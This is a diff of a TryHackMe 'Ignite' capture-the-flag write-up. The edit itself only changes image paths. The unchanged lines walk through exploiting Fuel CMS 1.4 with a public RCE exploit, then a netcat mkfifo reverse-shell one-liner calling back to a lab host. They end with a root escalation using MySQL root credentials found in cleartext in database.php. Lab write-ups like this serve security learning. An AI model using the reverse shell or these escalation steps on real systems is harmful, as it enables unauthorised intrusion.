@@ -2,7 +2,7 @@
 ---
 
 <p align="center">
-  <img src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Ignite%20Image%201.png" alt="image alt" width="180" />
+  <img src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Ignite%20Image%201.png" alt="image alt" width="180" />
 </p>
 
 [![Day 11 & 12 of 30 – Hack Documentation Challenge](https://img.shields.io/badge/Day%2011%20%26%2012%20of%2030-Hack%20Documentation%20Challenge-crimson?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
@@ -21,13 +21,13 @@ Launching the target machine, completing an Nmap scan is the first step to enume
 
 The scan revealed 1 port being visibly open: Port 80, Service HTTP, Version Apache httpd 2.4.18 ((Ubuntu)).
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%201.png)
+![Alt text](1)
 
 Since the Nmap scan confirmed that an HTTP service is running on the target machine, I proceeded to navigate to the IP address in my browser to begin exploring the web application.
 
 Accessing the IP address directed me to the Fuel CMS homepage, which displayed the version number as 1.4.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%202.png)
+![Alt text](2)
 
 According to research, **Fuel CMS** is an open-source content management system built on the CodeIgniter PHP framework. It provides a user-friendly interface for content managers while also offering developers the flexibility to customize the application's behavior behind the scenes. In essence, it's both a CMS and a development platform.
 
@@ -37,7 +37,7 @@ Notably, Fuel CMS v1.4 is relatively outdated and is known to contain vulnerabil
 
 While exploring the web server, I checked the `robots.txt` file and found a disallowed path: `/fuel/`. This suggests that the `/fuel/` directory may contain a sensitive interface, likely the CMS backend or admin panel.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%203.png)
+![Alt text](3)
 
 Using Searchsploit, I located a known Remote Code Execution exploit for Fuel CMS:
 - `linux/webapps/47138.py`
@@ -46,11 +46,11 @@ This exploit specifically targets vulnerabilities within the `/fuel/` directory.
 
 I customized the Python code by removing the Burp Suite proxy settings, as they weren’t needed for this setup.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%204.png)
+![Alt text](4)
 
 Running the customized exploit successfully launched a non-interactive shell on the target machine.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%205.png)
+![Alt text](5)
 
 To upgrade this shell to an interactive one, I opened a Netcat listener on port `5555` and used a reverse shell payload generated from the Reverse Shell Generator website.
 
@@ -61,9 +61,9 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.188.239 5555 > /tmp
 
 This command quietly creates a named pipe (`mkfifo`) to establish a temporary communication tunnel between the attacker and target, allowing for interactive shell access.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%206.png)
+![Alt text](6)
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%207.png)
+![Alt text](7)
 
 While testing commands through the non-interactive shell, I encountered the following error:
 ```
@@ -78,7 +78,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 This successfully upgraded the shell and allowed smoother command interaction.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%208.png)
+![Alt text](8)
 
 Continuing my enumeration, I discovered a file named `database.php` located at:
 ```
@@ -87,19 +87,19 @@ Continuing my enumeration, I discovered a file named `database.php` located at:
 ```
 Inside, I found plaintext MySQL root credentials, stored in cleartext within the configuration.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%209.png)
+![Alt text](9)
 
 Using the retrieved credentials, I successfully attempted to escalate privileges by switching users. The credentials were reused at the system level, allowing me to gain full root access to the machine.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%2010.png)
+![Alt text](10)
 
 With root access established, I was able to locate both challenge flags:
 - **User flag:** Found in the home directory
 - **Root flag:** Located in `/root`
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%2011.png)
+![Alt text](11)
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%2012.png)
+![Alt text](12)
 
 **Lessons Learned:**
 
